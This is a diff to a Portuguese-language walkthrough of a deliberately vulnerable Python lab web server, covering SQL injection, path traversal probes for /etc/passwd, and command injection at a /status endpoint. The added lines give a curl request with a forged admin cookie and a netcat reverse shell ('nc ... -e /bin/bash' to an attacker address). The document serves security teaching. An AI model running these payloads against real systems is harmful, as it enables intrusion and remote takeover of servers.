@@ -26,8 +26,6 @@ Description: This is the Linux server with the vulnerable site for the Python_Sa
 
 AMI id: ami-01127273b979fe92b
 
-
-
 # Falhas e Ataques
 
 #### Página Inicial: SQL Injection
@@ -77,8 +75,7 @@ A página Sobre Nós claramente exibe o conteúdo de arquivos texto que estão n
 Vamos explorar esse parâmetro:
 
 - ?doc=x: Tela em branco
-
-- doc=/etc/passwd: Tela em branco
+- ?doc=/etc/passwd: Tela em branco
 
 Provavelmente não vemos nada porque esse campo recebe o nome do arquivo e faz prepend de um caminho e append de uma extensão. Logo, termo_de_uso deve virar algo como /pasta/termo_de_uso.txt. Se isso for verdade, podemos testar com diretórios relativos + null bytes e também com múltiplos nomes de arquivos.
 
@@ -129,3 +126,12 @@ Como não há nenhum recurso que impeça múltiplos requests sequenciais, ferram
 #### Status: Form Tampering (or Poisoning)
 
 O diretório /status que só permite a execução de determinados comandos e apenas para o usuário admin, pode ser burlado via troca de parâmetros no request para que comandos sejam enviados diretamente ao servidor.
+
+Exemplo: 
+
+curl --cookie 'pyverysafelogin=21232f297a57a5a743894a0e4a801fc3' 'http://localhost:8000/status' -X POST --data 'cmd=ls -l /'
+
+Um shell remoto pode ser lançado aqui:
+
+- Atacante: nc -lvp 3000
+- Vítima: nc 192.168.15.25 3000 -e /bin/bash
